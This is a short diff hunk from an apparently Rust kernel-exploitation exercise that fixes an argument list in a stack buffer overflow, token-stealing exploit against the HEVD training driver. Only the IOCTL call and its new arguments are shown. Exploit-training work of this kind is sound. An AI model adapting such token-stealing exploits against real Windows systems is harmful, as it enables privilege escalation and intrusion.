@@ -96,6 +96,8 @@ fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
         HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
         user_buffer_address,
         user_buffer.len().try_into().unwrap(),
+        std::ptr::null_mut(),
+        0,
     );
 
     close_handle(h_device);
